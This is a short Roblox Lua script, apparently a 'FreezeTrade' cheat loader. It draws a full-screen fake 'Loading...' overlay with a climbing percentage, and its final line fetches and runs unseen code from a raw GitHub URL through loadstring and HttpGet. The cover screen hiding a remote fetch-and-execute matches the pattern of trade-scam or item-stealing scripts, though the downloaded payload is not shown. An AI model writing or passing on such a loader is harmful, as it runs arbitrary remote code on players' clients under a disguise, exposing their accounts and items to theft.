local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old loader if exists
local oldLoader = PlayerGui:FindFirstChild("FreezeTradeLoader")
if oldLoader then oldLoader:Destroy() end

-- Create loader UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FreezeTradeLoader"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = PlayerGui

local Background = Instance.new("Frame", ScreenGui)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Title = Instance.new("TextLabel", Background)
Title.Size = UDim2.new(1, 0, 0, 100)
Title.Position = UDim2.new(0, 0, 0.3, 0)
Title.Text = "Loading..."
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 36
Title.BackgroundTransparency = 1

local PercentLabel = Instance.new("TextLabel", Background)
PercentLabel.Size = UDim2.new(1, 0, 0, 50)
PercentLabel.Position = UDim2.new(0, 0, 0.5, 0)
PercentLabel.Text = "0%"
PercentLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextSize = 32
PercentLabel.BackgroundTransparency = 1

-- Loading Loop
spawn(function()
	for i = 1, 100 do
		PercentLabel.Text = i .. "%"
		wait(0.03) -- You can speed it up or slow it down
	end

	ScreenGui:Destroy()
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/rzzsupport/rzz/refs/heads/main/use"))()
